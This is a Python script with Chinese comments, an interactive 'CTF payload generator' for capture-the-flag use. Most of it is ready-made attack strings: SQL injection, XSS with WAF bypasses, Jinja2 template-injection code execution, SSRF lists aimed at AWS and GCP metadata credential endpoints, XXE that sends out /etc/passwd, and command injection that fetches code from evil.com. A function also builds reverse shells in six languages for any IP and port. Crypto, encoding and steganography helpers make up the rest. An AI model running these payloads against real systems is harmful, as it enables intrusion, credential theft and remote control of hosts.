#!/usr/bin/env python3
"""
CTF Payload 生成器
生成各种漏洞利用的 payload
"""

import base64
import urllib.parse
import json
import struct
import sys
from typing import Optional


class PayloadGenerator:
    """CTF Payload 生成器集合"""

    # ==================== Web Payloads ====================

    @staticmethod
    def sqli_union(table: str = "users", columns: str = "username,password",
                   db: str = "information_schema") -> str:
        """生成 UNION SQL 注入 payload"""
        return f"1 UNION SELECT 1,GROUP_CONCAT({columns}),3 FROM {db}.{table}-- -"

    @staticmethod
    def sqli_error_based() -> str:
        """生成报错注入 payload"""
        return ("1 AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- -")

    @staticmethod
    def sqli_time_based(delay: int = 5) -> str:
        """生成时间盲注 payload"""
        return f"1 AND IF(1=1,SLEEP({delay}),0)-- -"

    @staticmethod
    def xss_basic() -> list:
        """基础 XSS payload 列表"""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ]

    @staticmethod
    def xss_bypass_waf() -> list:
        """绕过 WAF 的 XSS payload"""
        return [
            "<svg/onload=alert(1)>",
            "<img src=x:alert(alt) onerror=eval(src) alt=Xss>",
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<form><button formaction=javascript:alert(1)>X</button>",
            "<object data=\"javascript:alert(1)\">",
            "<embed src=\"javascript:alert(1)\">",
        ]

    @staticmethod
    def ssti_jinja2_rce(cmd: str = "id") -> str:
        """Jinja2 SSTI RCE payload"""
        return (f"{{{{''.__class__.__mro__[1].__subclasses__()[132]"
                f".__init__.__globals__['popen']('{cmd}').read()}}}}")

    @staticmethod
    def ssti_jinja2_bypass() -> list:
        """Jinja2 SSTI 绕过 payload"""
        return [
            "{{request.__class__.__mro__[1].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{lipsum.__globals__.os.popen('id').read()}}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        ]

    @staticmethod
    def ssrf_aws_metadata() -> list:
        """AWS 元数据 SSRF payload"""
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ]

    @staticmethod
    def ssrf_gcp_metadata() -> list:
        """GCP 元数据 SSRF payload"""
        return [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ]

    @staticmethod
    def ssrf_bypass() -> list:
        """SSRF 绕过 payload"""
        return [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://0x7f000001/",
            "http://2130706433/",  # 127.0.0.1 十进制
            "http://017700000001/",  # 八进制
            "http://127.1/",
            "http://127.0.0.1.nip.io/",
            "http://spoofed.burpcollaborator.net/",
            "http://127.0.0.1\\@evil.com/",
            "http://evil.com\\@127.0.0.1/",
            "gopher://127.0.0.1:6379/_FLUSHALL%0aSET%20key%20value",
        ]

    @staticmethod
    def xxe_basic() -> str:
        """基础 XXE payload"""
        return ('<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                ']>\n'
                '<root>&xxe;</root>')

    @staticmethod
    def xxe_oob(callback_url: str) -> str:
        """OOB XXE payload"""
        return (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                f'  <!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">\n'
                f'  %dtd;\n'
                f'  %send;\n'
                f']>\n'
                f'<root>test</root>')

    @staticmethod
    def command_injection() -> list:
        """命令注入 payload"""
        return [
            ";id",
            "|id",
            "&&id",
            "||id",
            "`id`",
            "$(id)",
            "\nid",
            ";cat /etc/passwd",
            ";curl http://evil.com/|bash",
            ";bash -i >& /dev/tcp/evil.com/4444 0>&1",
        ]

    @staticmethod
    def reverse_shell(ip: str, port: int) -> list:
        """生成各种反弹 shell"""
        return [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"perl -e 'use Socket;socket(S,2,1,0);connect(S,pack_sockaddr_in({port},inet_aton(\"{ip}\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\")'",
            f"nc -e /bin/sh {ip} {port}",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh <&3 >&3 2>&3\");'",
            f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        ]

    # ==================== Crypto Payloads ====================

    @staticmethod
    def rsa_small_e(c: int, e: int = 3) -> Optional[int]:
        """RSA 小 e 攻击（e 很小时 c = m^e 无模运算，直接开根）"""
        # 优先使用 gmpy2（更快），不可用时用纯 Python 实现的整数开根
        try:
            import gmpy2
            m = gmpy2.iroot(c, e)[0]
            if int(m) ** e == c:
                return int(m)
            return None
        except ImportError:
            # 纯 Python 整数开根（牛顿迭代）
            if c < 0:
                return None
            if c == 0:
                return 0
            # 初始猜测
            x = 1 << ((c.bit_length() + e - 1) // e)
            while True:
                y = ((e - 1) * x + c // (x ** (e - 1))) // e
                if y >= x:
                    break
                x = y
            if x ** e == c:
                return x
            return None

    @staticmethod
    def xor_decrypt(data: bytes, key) -> bytes:
        """XOR 解密（key 支持 int 或 bytes）"""
        if isinstance(key, int):
            return bytes([d ^ key for d in data])
        return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])

    @staticmethod
    def rc4(key: bytes, data: bytes) -> bytes:
        """RC4 加解密"""
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        result = []
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(byte ^ S[(S[i] + S[j]) % 256])
        return bytes(result)

    # ==================== Encoding ====================

    @staticmethod
    def encode_base64(data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    @staticmethod
    def decode_base64(data: str) -> str:
        return base64.b64decode(data).decode()

    @staticmethod
    def encode_url(data: str) -> str:
        return urllib.parse.quote(data)

    @staticmethod
    def decode_url(data: str) -> str:
        return urllib.parse.unquote(data)

    @staticmethod
    def encode_hex(data: str) -> str:
        return data.encode().hex()

    @staticmethod
    def decode_hex(data: str) -> str:
        return bytes.fromhex(data).decode()

    @staticmethod
    def encode_unicode(data: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in data)

    @staticmethod
    def decode_unicode(data: str) -> str:
        return data.encode().decode('unicode_escape')

    # ==================== Misc ====================

    @staticmethod
    def extract_lsb(image_path: str) -> str:
        """提取图片 LSB"""
        from PIL import Image
        img = Image.open(image_path)
        pixels = img.load()
        width, height = img.size
        bits = ''
        for y in range(height):
            for x in range(width):
                r, g, b = pixels[x, y][:3]
                bits += str(r & 1)
                if len(bits) >= 8:
                    break
            if len(bits) >= 8:
                break
        return ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))

    @staticmethod
    def jwt_none_algorithm(payload: dict) -> str:
        """JWT None 算法绕过"""
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()
        return f"{header}.{payload_b64}."


def main():
    gen = PayloadGenerator()

    print("=" * 60)
    print("CTF Payload 生成器")
    print("=" * 60)

    while True:
        print("\n选择功能:")
        print("1. SQL 注入 payload")
        print("2. XSS payload")
        print("3. SSTI payload")
        print("4. SSRF payload")
        print("5. XXE payload")
        print("6. 命令注入 payload")
        print("7. 反弹 shell")
        print("8. 编码/解码")
        print("9. Crypto 工具")
        print("0. 退出")

        choice = input("\n选择: ").strip()

        if choice == "1":
            print("\nSQL 注入 payload:")
            print(f"  UNION: {gen.sqli_union()}")
            print(f"  报错: {gen.sqli_error_based()}")
            print(f"  时间: {gen.sqli_time_based()}")
        elif choice == "2":
            print("\nXSS payload:")
            for p in gen.xss_basic():
                print(f"  {p}")
            print("\n绕过 WAF:")
            for p in gen.xss_bypass_waf():
                print(f"  {p}")
        elif choice == "3":
            cmd = input("命令 (默认 id): ").strip() or "id"
            print(f"\nJinja2 RCE: {gen.ssti_jinja2_rce(cmd)}")
            print("\n绕过 payload:")
            for p in gen.ssti_jinja2_bypass():
                print(f"  {p}")
        elif choice == "4":
            print("\nAWS 元数据:")
            for p in gen.ssrf_aws_metadata():
                print(f"  {p}")
            print("\nGCP 元数据:")
            for p in gen.ssrf_gcp_metadata():
                print(f"  {p}")
            print("\n绕过:")
            for p in gen.ssrf_bypass():
                print(f"  {p}")
        elif choice == "5":
            print("\n基础 XXE:")
            print(gen.xxe_basic())
            url = input("\n回调 URL (OOB): ").strip()
            if url:
                print(gen.xxe_oob(url))
        elif choice == "6":
            print("\n命令注入 payload:")
            for p in gen.command_injection():
                print(f"  {p}")
        elif choice == "7":
            ip = input("IP: ").strip()
            port = int(input("端口: ").strip())
            print("\n反弹 shell:")
            for p in gen.reverse_shell(ip, port):
                print(f"  {p}")
        elif choice == "8":
            data = input("数据: ").strip()
            print(f"\nBase64: {gen.encode_base64(data)}")
            print(f"URL: {gen.encode_url(data)}")
            print(f"Hex: {gen.encode_hex(data)}")
            print(f"Unicode: {gen.encode_unicode(data)}")
        elif choice == "9":
            print("\nCrypto 工具:")
            print("  1. XOR 解密")
            print("  2. RC4")
            print("  3. RSA 小 e")
            sub = input("选择: ").strip()
            if sub == "1":
                data = bytes.fromhex(input("数据(hex): ").strip())
                key = input("Key: ").strip().encode()
                print(f"结果: {gen.xor_decrypt(data, key)}")
            elif sub == "2":
                data = bytes.fromhex(input("数据(hex): ").strip())
                key = input("Key: ").strip().encode()
                print(f"结果: {gen.rc4(key, data)}")
            elif sub == "3":
                c = int(input("c: ").strip())
                e = int(input("e (默认 3): ").strip() or "3")
                m = gen.rsa_small_e(c, e)
                if m:
                    print(f"m: {m}")
                    try:
                        print(f"明文: {bytes.fromhex(hex(m)[2:]).decode()}")
                    except:
                        pass
        elif choice == "0":
            break


if __name__ == "__main__":
    main()
